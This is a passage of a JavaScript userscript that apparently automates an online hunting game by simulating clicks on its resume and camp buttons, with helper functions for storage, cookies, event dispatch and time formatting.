	if (linkElementList)
	{
		var i;
		for (i = 0; i < linkElementList.length; ++i)
		{
			// check if it is a resume button
			if (linkElementList[i].getAttribute('src').indexOf("resume_hunting_blue.gif") != -1)
			{
				// found resume button
				
				// simulate mouse click on the horn
				var resumeElement = linkElementList[i].parentNode;
				fireEvent(resumeElement, 'click');
				resumeElement = null;
					
				// reload url if click fail
				window.setTimeout(function () { reloadWithMessage("Fail to click on resume button. Reloading...", false); }, 6000);
					
				// recheck if the resume button is click because some time even the url reload also fail
				window.setTimeout(function () { checkResumeButton(); }, 10000);
				
				found = true;
				break;
			}
		}
		i = null;
	}
	
	linkElementList = null;
	
	try 
	{
		return (found);
	} 
	finally 
	{
		found = null;
	}
}

// ################################################################################################
//   King's Reward Function - End
// ################################################################################################



// ################################################################################################
//   Trap Check Function - Start
// ################################################################################################

function trapCheck()
{
	// update timer
	displayTimer("Checking The Trap...", "Checking trap now...", "Checking trap now...");
	
	// simulate mouse click on the camp button
	var campElement = document.getElementsByClassName('campbutton')[0].firstChild;
	fireEvent(campElement, 'click');
	campElement = null;
		
	// reload the page if click on camp button fail
	window.setTimeout(function () { reloadWithMessage("Fail to click on camp button. Reloading...", false); }, 5000);
}

// ################################################################################################
//   Trap Check Function - End
// ################################################################################################


// ################################################################################################
//   General Function - Start
// ################################################################################################

function browserDetection()
{
	var browserName = "unknown";

	var userAgentStr = navigator.userAgent.toString().toLowerCase();
	if (userAgentStr.indexOf("firefox") >= 0)
	{
		browserName = "firefox";
	}
	else if (userAgentStr.indexOf("opera") >= 0)
	{
		browserName = "opera";
	}
	else if (userAgentStr.indexOf("chrome") >= 0)
	{
		browserName = "chrome";
	}
	userAgentStr = null;
	
	try
	{
		return (browserName);
	}
	finally
	{
		browserName = null;
	}
}

function setStorage(name, value)
{
	// check if the web browser support HTML5 storage
	if ('localStorage' in window && window['localStorage'] !== null)
	{
		window.localStorage.setItem(name, value);
	}
	
	name = undefined;
	value = undefined;
}

function removeStorage(name)
{
	// check if the web browser support HTML5 storage
	if ('localStorage' in window && window['localStorage'] !== null)
	{
		window.localStorage.removeItem(name);
	}
	name = undefined;
}

function getStorage(name)
{
	// check if the web browser support HTML5 storage
	if ('localStorage' in window && window['localStorage'] !== null)
	{
		return (window.localStorage.getItem(name));
	}
	name = undefined;
}

function getCookie(c_name)
{
	if (document.cookie.length > 0)
	{
		var c_start = document.cookie.indexOf(c_name + "=");
		if (c_start != -1)
		{
			c_start = c_start + c_name.length + 1;
			var c_end = document.cookie.indexOf(";", c_start);
			if (c_end == -1) 
			{
				c_end = document.cookie.length;
			}
			
			var cookieString = unescape(document.cookie.substring(c_start, c_end));
			
			// clean up
			c_name = null;
			c_start = null;
			c_end = null;
			
			try
			{
				return cookieString;
			}
			finally
			{
				cookieString = null;
			}
		}
		c_start = null;
	}
	c_name = null;
	return null;
}

function fireEvent(element, event)
{
	if (document.createEventObject)
	{
		// dispatch for IE
		var evt = document.createEventObject();

		try 
		{
			return element.fireEvent('on' + event, evt);
		} 
		finally 
		{
			element = null;
			event = null;
			evt = null;
		}
	}
	else
	{
		// dispatch for firefox + others
		var evt = document.createEvent("HTMLEvents");
		evt.initEvent(event, true, true ); // event type,bubbling,cancelable
		
		try 
		{
			return !element.dispatchEvent(evt);
		} 
		finally 
		{
			element = null;
			event = null;
			evt = null;
		}
	}
}

function getPageVariableForChrome(variableName)
{
	// google chrome only
	var scriptElement = document.createElement("script");
	scriptElement.setAttribute('id', "scriptElement");
	scriptElement.setAttribute('type', "text/javascript");
	scriptElement.innerHTML = "document.getElementById('scriptElement').innerText=" + variableName + ";";
	document.body.appendChild(scriptElement);
	
	var value = scriptElement.innerHTML;
	document.body.removeChild(scriptElement);
	scriptElement = null;
	variableName = null;
	
	try 
	{
		return (value);
	} 
	finally 
	{
		value = null;
	}
}

function timeElapsed(dateA, dateB)
{
	var elapsed = 0;

	var secondA = Date.UTC(dateA.getFullYear(), dateA.getMonth(), dateA.getDate(), dateA.getHours(), dateA.getMinutes() , dateA.getSeconds());
	var secondB = Date.UTC(dateB.getFullYear(), dateB.getMonth(), dateB.getDate(), dateB.getHours(), dateB.getMinutes() , dateB.getSeconds());
	elapsed = (secondB - secondA) / 1000;
	
	secondA = null;
	secondB = null;
	dateA = null;
	dateB = null;
	
	try
	{
		return (elapsed);
	}
	finally
	{
		elapsed = null;
	}
}

function timeformat(time)
{
	var timeString;
	var hr = Math.floor(time / 3600);
	var min = Math.floor((time % 3600) / 60);
	var sec = (time % 3600 % 60) % 60;
	
	if (hr > 0)
	{
		timeString = hr.toString() + " hr " + min.toString() + " min " + sec.toString() + " sec";
	}
	else if (min > 0)
	{
		timeString = min.toString() + " min " + sec.toString() + " sec";
	}
	else
	{
		timeString = sec.toString() + " sec";
	}
	
	time = null;
	hr = null;
	min = null;
	sec = null;
	
	try 
	{
		return (timeString);
	} 
	finally 
	{
		timeString = null;
	}
}

function timeFormatLong(time)
{
	var timeString;
	
	if (time != -1)
	{
		var day = Math.floor(time / 86400);
		var hr = Math.floor((time % 86400) / 3600);
		var min = Math.floor((time % 3600) / 60);
		
		if (day > 0)
		{
			timeString = day.toString() + " day " + hr.toString() + " hr " + min.toString() + " min ago";
		}
		else if (hr > 0)
		{
			timeString = hr.toString() + " hr " + min.toString() + " min ago";
		}
		else if (min > 0)
		{
			timeString = min.toString() + " min ago";
		}
		
		day = null;
		hr = null;
		min = null;
	}
	else
	{
		timeString = null;
	}
	
	time = null;
	
	try 
	{
		return (timeString);
	} 
	finally 
	{
		timeString = null;
	}
}

// ################################################################################################
//   General Function - End
// ################################################################################################
